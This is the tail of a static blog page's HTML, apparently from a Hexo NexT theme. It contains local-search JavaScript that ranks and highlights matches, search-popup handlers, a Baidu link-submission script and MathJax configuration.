                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
